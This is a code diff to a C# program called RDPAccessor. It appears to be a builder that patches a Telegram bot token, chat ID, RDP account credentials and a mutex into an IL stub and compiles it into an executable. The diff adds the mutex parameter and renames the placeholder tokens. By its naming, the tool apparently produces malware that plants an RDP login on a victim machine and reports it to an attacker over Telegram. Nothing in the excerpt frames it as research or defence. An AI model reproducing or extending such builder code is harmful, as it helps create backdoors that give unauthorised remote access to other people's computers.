@@ -37,9 +37,10 @@ namespace RDPAccessor
             string tokenBot = botTokenBox.Text,
                    chatId = chatidBox.Text,
                    username = accUsernameBox.Text,
-                   password = accPasswdBox.Text;
+                   password = accPasswdBox.Text,
+                   mutex = mutexBox.Text;
 
-            if (string.IsNullOrEmpty(tokenBot) || string.IsNullOrEmpty(chatId) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
+            if (string.IsNullOrEmpty(tokenBot) || string.IsNullOrEmpty(chatId) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password) || string.IsNullOrEmpty(mutex))
             {
                 SetStatusLabel("Error - forms cannot be empty!", Color.Red);
             }
@@ -53,7 +54,7 @@ namespace RDPAccessor
                 if (Directory.Exists(stubPath) && File.Exists(stubFilePath))
                 {
                     string ilCode = File.ReadAllText(stubFilePath);
-                    ilCode = ReplaceTokens(ilCode, tokenBot, chatId, username, password);
+                    ilCode = ReplaceTokens(ilCode, tokenBot, chatId, username, password, mutex);
 
                     string tempFilePath = Path.Combine(stubPath, "stubtemp.il");
                     File.WriteAllText(tempFilePath, ilCode, Encoding.UTF8);
@@ -105,20 +106,22 @@ namespace RDPAccessor
             chatidBox.Clear();
             accUsernameBox.Clear();
             accPasswdBox.Clear();
+            mutexBox.Clear();
         }
 
-        private string ReplaceTokens(string ilCode, string tokenBot, string chatId, string username, string password)
+        private string ReplaceTokens(string ilCode, string tokenBot, string chatId, string username, string password, string mutex)
         {
             return ilCode
-                .Replace("TOKENBOT", tokenBot)
-                .Replace("CHATIDUSER", chatId)
-                .Replace("RDPUSERNAME", username)
-                .Replace("RDPPASSWORD", password);
+                .Replace("token_bot", tokenBot)
+                .Replace("chatid_user", chatId)
+                .Replace("zxc_user", username)
+                .Replace("zxc_pass", password)
+                .Replace("zxc_mutex", mutex);
         }
 
         private void CompileIlCode(string ilasmPath, string tempFilePath, string exeOutputPath)
         {
-            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            Process process = new Process();
             process.StartInfo.FileName = ilasmPath;
             process.StartInfo.Arguments = $"\"{tempFilePath}\" /output=\"{exeOutputPath}\"";
             process.StartInfo.UseShellExecute = false;
